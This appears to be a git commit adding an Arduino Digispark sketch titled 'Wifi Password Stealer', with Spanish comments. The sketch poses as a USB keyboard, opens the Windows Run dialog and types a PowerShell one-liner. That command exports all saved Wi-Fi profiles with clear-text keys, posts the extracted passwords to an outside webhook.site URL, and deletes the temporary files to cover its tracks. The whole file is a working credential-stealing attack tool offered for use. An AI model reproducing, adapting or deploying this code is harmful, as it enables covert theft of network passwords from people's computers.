4b30ed1a3c20ee41d08c1b4ed192159cad1c1230
Randy Nin <randyninstudy@gmail.com>
2025-10-18 23:03:00 -0400

    Add files via upload

---
+++ Wifi Password Stealer.ino
@@ -0,0 +1,31 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  // Inicializa la librería y espera a que el sistema operativo detecte el dispositivo.
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(2000); 
+
+  // 1. Abrir el diálogo "Ejecutar" (Win + R)
+  // MOD_GUI_LEFT es la tecla de Windows
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+
+  // 2. Escribir el comando completo.
+  
+  // EJECUTAR COMANDOS.
+  DigiKeyboard.print("powershell -Command \"cd $env:TEMP; netsh wlan export profile key=clear; sls Wi*.xml -Pattern 'keyMaterial' | Out-File Wi-Fi-PASS; Invoke-WebRequest -Uri https://webhook.site/55a0273c-f7e8-4719-a4fc-77a31efea3d6 -Method POST -InFile Wi-Fi-PASS; rm Wi-* -Force\"");
+  DigiKeyboard.delay(500);
+
+  // Presionar Enter para confirmar
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+  DigiKeyboard.delay(4000); // Esperar a que se abra PowerShell (o falle)
+  
+  // Evita que el microcontrolador se reinicie y ejecute el comando repetidamente.
+  for(;;){} 
+}
+
+void loop() {
+  // El bucle loop se deja vacío para que el script solo se ejecute una vez
+  // en el setup.
+}
+
